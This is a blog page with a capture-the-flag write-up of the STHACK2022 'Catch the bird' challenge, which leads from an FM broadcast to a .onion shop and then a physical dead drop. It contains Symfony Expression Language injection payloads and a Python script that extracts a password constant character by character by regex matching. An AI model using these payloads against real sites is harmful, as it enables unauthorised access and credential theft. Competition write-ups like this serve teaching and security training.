<!doctype html>
<html class="not-ready lg:text-base overflow-y-scroll scroll-pt-14" lang="en">

<head prefix="og: https://ogp.me/ns# article: https://ogp.me/ns/article#">
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
  <meta name="generator" content="Zola" />
  <title>STHACK2022 - Catch the bird, a trip from web to IRL | Swissky's Lab</title>
  <meta property="og:site_name" content="Swissky&apos;s Lab" />
  <meta property="og:title" content="STHACK2022 - Catch the bird, a trip from web to IRL" />
  <meta name="description" content="Challenge author: ajaniCategory: web, physicalThe challenge started with the following Post Card![Post Card]({{ site.baseurl }}/images/STHACK2022/sthack2022_post-card.png)" />
  <meta property="og:description" content="Challenge author: ajaniCategory: web, physicalThe challenge started with the following Post Card![Post Card]({{ site.baseurl }}/images/STHACK2022/sthack2022_post-card.png)" />
  <meta property="og:url" content="https://swisskyrepo.github.io/blog/sthack2022/" />
  <link rel="canonical" href="https://swisskyrepo.github.io/blog/sthack2022/" />
  <meta property="og:type" content="article" />
  <meta property="article:published_time" content="2022-05-21T00:00:00+00:00" />
  <meta property="og:image" content="https://swisskyrepo.github.io/images/STHACK2022/sthack2022_post-card.png" />
  <meta property="og:image:alt" content="STHACK2022 - Catch the bird, a trip from web to IRL" />
  <meta property="og:image:width" content="861" />
  <meta property="og:image:height" content="574" />
  <meta property="og:image:type" content="image/png" />
  <link rel="alternate" type="application/atom+xml" href="https://swisskyrepo.github.io/atom.xml" title="Swissky&apos;s Lab | Atom" />
  <link rel="alternate" type="application/rss+xml" href="https://swisskyrepo.github.io/rss.xml" title="Swissky&apos;s Lab | RSS" />
  <link rel="license" href="https://creativecommons.org/licenses/by-sa/4.0/deed" />
  <!-- Begin Head inject -->
  
  <!-- End Head inject -->
  <link rel="stylesheet" href="https://swisskyrepo.github.io/main.min.css?h=fc65ba308cf36d3ba82c" />
  <style>
  :root{--bg: #f4f4f5; --header: #e4e4e7; color-scheme: light;}
  :root.dark{--bg: #18181b; --header: #27272a; color-scheme: dark;}
  </style>
  <meta name="theme-color" data-light="#e4e4e7" data-dark="#27272a" content="#e4e4e7" />
  <link rel="icon" type="image/x-icon" sizes="16x16" href="https://swisskyrepo.github.io/favicon.ico" />
  <link rel="apple-touch-icon" type="image/png" href="https://swisskyrepo.github.io/apple-touch-icon.png?h=58bee300054c5308feb3" />
  <link rel="icon" type="image/png" href="https://swisskyrepo.github.io/android-icon.png?h=8d80ec95446bd2c36826" />
  <script src="https://swisskyrepo.github.io/js/linkita.min.js?h=1dd3ed42fc674277bc34"></script>
  <script src="https://swisskyrepo.github.io/js/linkita-search.min.js?h=698547b4b081d012c661"></script>
  <!-- Begin Head End inject -->
  <!-- Umami analytics -->
<script defer src="https://cloud.umami.is/script.js" data-website-id="3da49f88-7825-49a6-b9cf-de0c7610e7dc"></script>

<!-- Custom CSS -->
<link rel="stylesheet" href="https://swisskyrepo.github.io/files/custom.css">

<!-- HEAD END -->
  <!-- End Head End inject -->
</head>

<body class="text-black duration-100 ease-out bg-[var(--bg)] dark:text-white">
  <!-- Header -->
<header class="bg-[var(--header)] fixed top-0 z-40 mx-auto min-h-[3.25rem] w-full header-icons">
  <div class="mx-auto w-full max-w-4xl p-2.5 lg:flex lg:justify-between">
    <div class="flex justify-between">
      <div class="flex items-center min-h-8">
        <a title="Go to home page" accesskey="!"
          href="https://swisskyrepo.github.io/" class="text-2xl font-semibold">Swissky&#x27;s Lab</a>
        <button type="button" title="Switch color scheme" accesskey="$"
          onclick="window.linkita.toggleDarkMode();" ondblclick="window.linkita.resetDarkMode();"
          class="btn-dark ml-4 h-6 w-6 shrink-0 cursor-pointer text-[0] bg-center bg-no-repeat bg-cover dark:invert [background-image:var(--icon-theme-dark)] dark:[background-image:var(--icon-theme-light)]"
        ></button>
        <button type="button" title="Search" accesskey="/"
          onclick="window.linkita.toggleSearch();"
          class="btn-search ml-4 h-6 w-6 shrink-0 cursor-pointer text-[0] bg-center bg-no-repeat bg-cover [background-image:var(--icon-search)] dark:invert"
        ></button>
        <script>window.linkita.initSearchButton({ scripts: ["https://swisskyrepo.github.io/elasticlunr.min.js", "https://swisskyrepo.github.io/search_index.en.js"] });</script>
      </div>
      <div title="Menu" role="button" accesskey="+" tabindex="0"
        class="btn-menu relative z-50 flex h-8 w-8 shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden"
        onclick="window.linkita.toggleHeaderMenu();"
        onkeydown="(event.keyCode == 13 || event.keyCode == 32) ? event.preventDefault() || window.linkita.toggleHeaderMenu() : true;"
      ></div>
    </div>
    <nav class="flex w-full items-center lg:w-auto">
      <menu
        class="nav-wrapper flex w-full flex-col py-2 lg:w-auto lg:flex-row lg:self-center lg:py-0">
        <li>
          <a
            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
            href="https://swisskyrepo.github.io/projects"
          >Projects</a>
        </li>
        <li>
          <a
            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
            href="https://swisskyrepo.github.io/posts"
          >Posts</a>
        </li>
        <li>
          <a
            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
            href="https://swisskyrepo.github.io/about"
          >About</a>
        </li>
      </menu>
      <!-- Begin Header Nav inject -->
      
      <!-- End Header Nav inject -->
    </nav>
  </div>
</header>

  <!-- Begin Body Start inject -->
  
  <!-- End Body Start inject -->
  <main class="prose prose-neutral relative mx-auto min-h-[calc(100%-4rem)]
    max-w-3xl break-words px-4 pb-12 pt-28 lg:pt-32 dark:prose-invert prose-pre:rounded-lg prose-img:rounded-lg">
      <!-- Search -->
<div id="linkita-search-wrapper" class="hidden">
  <ul id="linkita-search-results"></ul>
</div>

    
<article>
  <!-- Begin Page Start inject -->
  
  <!-- End Page Start inject -->

  <header class="mb-16">
    <h1 class="!my-0 pb-2.5">STHACK2022 - Catch the bird, a trip from web to IRL</h1>
    <!-- Page Info -->
<div class="text-sm antialiased opacity-80"><time
      datetime="2022-05-21T00:00:00+00:00">2022-05-21</time><span
        class="mx-1">&middot;</span><time
    datetime="PT0H5M0S">5&nbsp;min</time>
</div>

  </header>
  <figure class="mb-12 mt-0">
    <img
      class="h-auto w-full rounded-lg"
      src="https://swisskyrepo.github.io/images/STHACK2022/sthack2022_post-card.png"
      alt="STHACK2022 - Catch the bird, a trip from web to IRL"
      width="861"
      height="574"
    />
  </figure>
  <!-- TOC -->

  <!-- Content -->
  <section><ul>
<li>Challenge author: ajani</li>
<li>Category: <code>web</code>, <code>physical</code></li>
</ul>
<p>The challenge started with the following Post Card</p>
<p>![Post Card]({{ site.baseurl }}/images/STHACK2022/sthack2022_post-card.png)</p>
<span id="continue-reading"></span>
<p>We also had the following scenario:</p>
<pre data-lang="php" style="background-color:#2b303b;color:#c0c5ce;" class="language-php "><code class="language-php" data-lang="php"><span>This time I think Archer have got himself involved in something far to big for him.
</span><span>
</span><span>Last time I&#39;ve seen him he seemed agitated, anxious, he kept telling about that man he was following, how he felt it had been made, and something about Malta and some bird statuette. That was 9 days ago and I haven&#39;t heard from Miles since then.
</span><span>
</span><span>It seems strange, but it wouldn&#39;t be the first time he didn&#39;t give news for days until he woke up to some unknown county of this damn country, with an empty bottle of the worst whisky and a skull full of the finest hangover. The guy love the bottle to much, and she didn&#39;t returned him so well. Yet, I could tell something was off, it didn&#39;t felt right.
</span><span>
</span><span>That was until this morning, when a post card arrived at the bureau mailbox. Postcard At first sight it&#39;s just a simple postcard to tell me he need to take some vacations right ? But here&#39;s the thing, Miles never lived at the 101.10 Marconi street...
</span><span>
</span><span>If Archer ask for my help then it must really be serious. I need to find where this statuette is, and judging by the postcard I must hurry, &#39;cause whomever have the damn bird, it seems like he want to sell it.
</span></code></pre>
<p>We quickly realized we needed to listen on the <strong>Radio Frequency</strong> 101.1Mhz inside the "Hotel de Ville". This was achieved using a Xiaomi Android Application, we recorded everything broadcasted on the frequency in this file:</p>
<ul>
<li>[Recording FM @ 101.1 MHz]({{ site.baseurl }}/images/STHACK2022/FM_101.1 MHz_20220520212911.mp3)</li>
</ul>
<p>We can hear the well known military code, which gave us this .onion website:
http://sthackmdbidwkyebhklnfnwmqhj3oxnke5inylzrtwzenr752tn77oad.onion:80, we accessed it using Tor.</p>
<p>After some time exploring the website we discovered "a feature" to send a mail with an extract of the current code when an error occured on the website.</p>
<p>We found two ways to trigger an error:</p>
<ul>
<li>trying to login using a wrong password: <code>LoginController.php</code></li>
<li>while injecting and breaking context inside the shop part of the website: <code>Lexer.php</code></li>
</ul>
<p>The team spent too much time trying to find a Server Side Template Injection since it was using a <code>twig</code> template in line 21@LoginController.php.</p>
<p>![Dump code controller]({{ site.baseurl }}/images/STHACK2022/sthack2022_dump_code_controller.png)
![Dump code lexer]({{ site.baseurl }}/images/STHACK2022/sthack2022_dump_code_lexer.png)</p>
<p>However while we were fuzzing the <code>category</code> field, we discovered the '<code>~</code>' was working to concatenate two strings in Twig and tried the following requests:</p>
<table><thead><tr><th>Query</th><th>Output</th><th>Indicator</th></tr></thead><tbody>
<tr><td>category=category == 'forgery'</td><td>Displays the product "Coated Something"</td><td>True</td></tr>
<tr><td>category=category == 'forg'~'ery'</td><td>Displays the product "Coated Something"</td><td>True</td></tr>
<tr><td>category=category == 'forg'<del>'ery'</del>'7'*7</td><td>Don't display but do not throw an error</td><td>False</td></tr>
</tbody></table>
<p>We had an oracle !! However we didn't manage to find an interesting primitive allowing us to execute commands.
So we used our favorite tool "Burp Suite Intruder" and fuzzed with the top 100 functions in PHP and Symfony and some weird behaviors started to appear.
The function <code>constant</code> was recognised by the parsing engine, then it clicked, the <code>Lexer.php</code> file was located in a folder called <code>expression language</code>. We tried to confirm the function using several global constants.</p>
<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span>category=category == &#39;</span><span style="color:#a3be8c;">forg</span><span>&#39;~&#39;</span><span style="color:#a3be8c;">ery</span><span>&#39;~&#39;</span><span style="color:#a3be8c;">7</span><span>&#39;*</span><span style="color:#d08770;">7
</span><span>category=category == &#39;</span><span style="color:#a3be8c;">forg</span><span>&#39;~&#39;</span><span style="color:#a3be8c;">ery</span><span>&#39;~</span><span style="color:#bf616a;">constant</span><span>(&quot;</span><span style="color:#a3be8c;">DB_USER</span><span>&quot;)
</span><span>category=category == &#39;</span><span style="color:#a3be8c;">forg</span><span>&#39;~&#39;</span><span style="color:#a3be8c;">ery</span><span>&#39;~</span><span style="color:#bf616a;">constant</span><span>(&quot;</span><span style="color:#a3be8c;">INFO_ALL</span><span>&quot;)
</span><span>category=category == &#39;</span><span style="color:#a3be8c;">forg</span><span>&#39;~&#39;</span><span style="color:#a3be8c;">ery</span><span>&#39;~</span><span style="color:#bf616a;">constant</span><span>(&quot;</span><span style="color:#a3be8c;">true</span><span>&quot;)
</span><span>category=category == &#39;</span><span style="color:#a3be8c;">forg</span><span>&#39;~&#39;</span><span style="color:#a3be8c;">ery</span><span>&#39;~</span><span style="color:#bf616a;">constant</span><span>(&quot;</span><span style="color:#a3be8c;">null</span><span>&quot;)
</span></code></pre>
<p>However it's only giving us the information about the existence of a constant it would be better to extract their value. Especially the value of the constant <code>self::PASSWORD</code>@LoginController.php.</p>
<p>First, we attempt to access the constant located in another file on the server. Thankfully the server errors were quite verbose and give us half of the payload :)</p>
<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span>Error : Attempted to load </span><span style="background-color:#bf616a;color:#2b303b;">class</span><span> &quot;</span><span style="color:#a3be8c;">LoginController</span><span>&quot; </span><span style="color:#b48ead;">from </span><span>namespace &quot;</span><span style="color:#a3be8c;">\App</span><span style="color:#96b5b4;">\\</span><span style="color:#a3be8c;">Controller</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">.</span><span style="background-color:#bf616a;color:#2b303b;">
</span><span>Did you forget a &quot;</span><span style="color:#a3be8c;">use</span><span>&quot; statement </span><span style="color:#b48ead;">for</span><span> &quot;App\</span><span style="background-color:#bf616a;color:#2b303b;">Controller\LoginController&quot;?</span><span>
</span></code></pre>
<p>The trick here was to add several backslash <code>\\\\</code></p>
<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span>&#39;</span><span style="color:#a3be8c;">forg</span><span>&#39;~&#39;</span><span style="color:#a3be8c;">ery</span><span>&#39;~</span><span style="color:#bf616a;">constant</span><span>(&quot;</span><span style="color:#96b5b4;">\\\\</span><span style="color:#a3be8c;">App</span><span style="color:#96b5b4;">\\\\</span><span style="color:#a3be8c;">Controller</span><span style="color:#96b5b4;">\\\\</span><span style="color:#a3be8c;">LoginController::PASSWORD</span><span>&quot;)
</span></code></pre>
<p>Now that we confirmed the access to the <code>PASSWORD</code> constant, we tried to read the characters one-by-one like any array with <code>array[0] == 'A'</code>. But the pain was only starting, Expression Language constant cannot be accessed like an array... We finally found an alternative using <strong>Regular Expressions</strong> and created a small script which was ... too slow, remember we are using Tor to connect to the .onion website and the shared network on site was a bit laggy.</p>
<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">import </span><span>requests
</span><span>
</span><span>flag = &quot;</span><span style="color:#a3be8c;">Ybhr</span><span>&quot;
</span><span>charset = &quot;</span><span style="color:#a3be8c;">azertyuiopqsdfghjklmwxcvbnAZERTYUIOPQSDFGHJKLMWXCVBN1234567890</span><span>&quot;
</span><span>
</span><span style="color:#b48ead;">for </span><span>c </span><span style="color:#b48ead;">in </span><span>charset:
</span><span>    burp0_url = &quot;</span><span style="color:#a3be8c;">http://sthackmdbidwkyebhklnfnwmqhj3oxnke5inylzrtwzenr752tn77oad.onion:80/</span><span>&quot;
</span><span>    burp0_headers = {&quot;</span><span style="color:#a3be8c;">User-Agent</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">Accept</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">Accept-Language</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">en-US,en;q=0.5</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">Accept-Encoding</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">gzip, deflate</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">Content-Type</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">application/x-www-form-urlencoded</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">Origin</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">http://sthackmdbidwkyebhklnfnwmqhj3oxnke5inylzrtwzenr752tn77oad.onion</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">Connection</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">close</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">Referer</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">http://sthackmdbidwkyebhklnfnwmqhj3oxnke5inylzrtwzenr752tn77oad.onion/</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">Upgrade-Insecure-Requests</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">1</span><span>&quot;}
</span><span>    burp0_data = {&quot;</span><span style="color:#a3be8c;">category</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">constant(</span><span style="color:#96b5b4;">\&quot;\\\\</span><span style="color:#a3be8c;">App</span><span style="color:#96b5b4;">\\\\</span><span style="color:#a3be8c;">Controller</span><span style="color:#96b5b4;">\\\\</span><span style="color:#a3be8c;">LoginController::PASSWORD</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">) matches </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">/^</span><span>&quot;+flag+&quot;</span><span style="color:#96b5b4;">\&quot; </span><span>&quot;, &quot;</span><span style="color:#a3be8c;">&amp; category </span><span>&quot;: &quot;</span><span style="color:#a3be8c;">= &#39;forgery&#39;</span><span>&quot;}
</span><span>    r = requests.</span><span style="color:#bf616a;">post</span><span>(burp0_url, </span><span style="color:#bf616a;">headers</span><span>=burp0_headers, </span><span style="color:#bf616a;">data</span><span>=burp0_data)
</span><span>    </span><span style="color:#96b5b4;">print</span><span>(c, </span><span style="color:#96b5b4;">len</span><span>(r.text))
</span></code></pre>
<p>Once again we turned to our Intruder and fuzzed with the charset <code>a-zA-Z0-9</code>, with the following payload: <code>category=constant("\\App\\Controller\\LoginController::PASSWORD") matches "/^Y[FUZZED_CHAR_ADDED_HERE]/" &amp;&amp; category == 'forgery'</code> and we got the following quite quickly: <code>Ybhr5vmjJD</code> after switching to our 4G network for a more reliable access.</p>
<p>Now we can access the Admin Panel and manage the products. Only one product (deaddrop) as available for purchase.</p>
<p>![Web Login]({{ site.baseurl }}/images/STHACK2022/sthack2022_deaddrop-login.png)</p>
<blockquote>
<p>Dead Drops is an anonymous, offline, peer to peer file-sharing network in public space. Anyone can access a Dead Drop and everyone may install a Dead Drop in their neighborhood/city. A Dead Drop must be public accessible. - The Dead Drops Manifesto</p>
</blockquote>
<p>The product coordinates were really close to us and the challenge was listed in the categories <code>web</code> and <code>physical</code>. We went there with a laptop and other tools like a lockpick set. Obviously the deaddrop wasn't embbeded into the "Hotel de Ville"'s wall, it was cemented to a pad lock ;)</p>
<p>![]({{ site.baseurl }}/images/STHACK2022/sthack2022_gpslocate.png)</p>
<p>Some interesting encrypted files were stored on the deaddrop and we had the key to decrypt them using the command <code>openssl aes-256-cbc -d -in whisky.txt.aes256cbc -out secrets2.txt.new</code></p>
<p>![AES secrets]({{ site.baseurl }}/images/STHACK2022/sthack2022_aes_key.png)</p>
<p>And now for the final step: a new onion URL from one of the decrypted file (maltapyzyfnwvgkl4se7tlhlrohule77cgnaguy2nouxyvosovjldbyd.onion). It seems to be an aunction website, but the site is not yet opened. The opening is scheduled for the 23rd May but something smells fishy, the Javascript was heavily obfuscated, and we are still waiting for our flag.</p>
<pre data-lang="js" style="background-color:#2b303b;color:#c0c5ce;" class="language-js "><code class="language-js" data-lang="js"><span style="color:#65737e;">// Example of Pentester&#39;s nightmare
</span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">_0x18c8</span><span>(</span><span style="color:#bf616a;">_0x46078f</span><span>,</span><span style="color:#bf616a;">_0xd7ff98</span><span>){</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">_0x33e42d</span><span>=</span><span style="color:#8fa1b3;">_0x3b53</span><span>();</span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">_0x18c8</span><span>=</span><span style="color:#b48ead;">function</span><span>(</span><span style="color:#bf616a;">_0x164e09</span><span>,</span><span style="color:#bf616a;">_0x470955</span><span>){</span><span style="color:#bf616a;">_0x164e09</span><span>=</span><span style="color:#bf616a;">_0x164e09</span><span>-(</span><span style="color:#d08770;">0x1063</span><span>+-</span><span style="color:#d08770;">0x19</span><span>*</span><span style="color:#d08770;">0x187</span><span>+</span><span style="color:#d08770;">0x16b7</span><span>);</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">_0xf46362</span><span>=</span><span style="color:#bf616a;">_0x33e42d</span><span>[</span><span style="color:#bf616a;">_0x164e09</span><span>];</span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">_0xf46362</span><span>;},</span><span style="color:#8fa1b3;">_0x18c8</span><span>(</span><span style="color:#bf616a;">_0x46078f</span><span>,</span><span style="color:#bf616a;">_0xd7ff98</span><span>);}</span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">_0x3b53</span><span>(){</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">_0x574953</span><span>=[&#39;</span><span style="color:#a3be8c;">aW9uYWwgbm</span><span>&#39;,&#39;</span><span style="color:#a3be8c;">4JDouuU</span><span>&#39;,&#39;</span><span style="color:#a3be8c;">fEdgK</span><span>&#39;[...]
</span></code></pre>
<p>Let's discuss methodology to apprehend this problem:</p>
<p>![JS deobf]({{ site.baseurl }}/images/STHACK2022/sthack2022_deobf.jpg)</p>
<p>Having spent wayyyy too much time on this challenge, we used a quite radical approach and changed our VM internal date slowly to arrived at the opening date: <code>date -s "2021-03-23 16:58:22"</code> and then we got our flag.</p>
<p>Overall the challenge was nice and interesting to resolve with my teammates. Having a bit of physical without resorting to use a full arsenal of HackRF, Proxmark or a crowbar was quite refreshing :)</p>
<p>![Scoreboard]({{ site.baseurl }}/images/STHACK2022/sthack2022_scoreboard.jpg)</p>
</section>
  <hr />
  <!-- Post Taxonomies -->

  <!-- Post Nav -->
<nav class="block-bg mt-12 flex flex-wrap rounded-lg text-lg">
  <a
    class="block-hover-mask flex min-w-[50%] grow items-center rounded-l-md p-6 pr-3 font-semibold no-underline"
    href="https://swisskyrepo.github.io/blog/auto-obfuscate-strings-with-nim/" accesskey=","
    ><span class="mr-1.5">&#8249;</span><span>Offensive Nim - Auto Obfuscate Strings with Nim&#x27;s Term-Rewriting Macros</span></a>
  <a
    class="block-hover-mask ml-auto flex min-w-[50%] grow items-center justify-end rounded-r-md p-6 pl-3 font-semibold no-underline"
    href="https://swisskyrepo.github.io/blog/fcsc/" accesskey="."
    ><span>FCSC - CTF Writeup</span><span class="ml-1.5">&#8250;</span></a>
</nav>

  <!-- Begin Page End inject -->
  <!-- Share page -->
<br>

<div class="robots-nocontent social-share-buttons">
  <b>Share this content</b>
  <br>
  <div class="a2a_kit a2a_kit_size_32 a2a_default_style">
    <a class="a2a_dd" href="https://www.addtoany.com/share"></a>
    <a class="a2a_button_x"></a>
    <a class="a2a_button_linkedin"></a>
    <a class="a2a_button_telegram"></a>
    <a class="a2a_button_mastodon"></a>
    <a class="a2a_button_email"></a>
    <a class="a2a_button_microsoft_teams"></a>
    <a class="a2a_button_threads"></a>
    <a class="a2a_button_bluesky"></a>
    <a class="a2a_button_whatsapp"></a>
  </div>
  <br>
  <script async src="https://static.addtoany.com/menu/page.js"></script>
</div>
  <!-- End Page End inject -->
</article>

  </main>
  <!-- Footer -->
<footer class="mx-auto flex lg:mt-5 max-w-3xl flex-wrap items-center px-4 py-3 text-sm opacity-60">
  <div class="mr-auto basis-full lg:basis-1/2">
  <a href="https://creativecommons.org/licenses/by-sa/4.0/deed">© <time datetime="2017">2017</time> - <time datetime="2025">2025</time> Swissky</a>
  </div>
  <div class="flex basis-full lg:basis-1/2 lg:justify-end">
    <span class="mr-6 lg:ml-6">
      <a class="link" href="https://www.getzola.org/" target="_blank">Powered by Zola</a>
    </span>
    <a class="link" href="https://www.getzola.org/themes/linkita/" target="_blank">&#9998; Linkita</a>
  </div>
  <!-- Begin Footer inject -->
  
  <!-- End Footer inject -->
</footer>

  
  <!-- Begin Body End inject -->
  
  <!-- End Body End inject -->
</body>

</html>
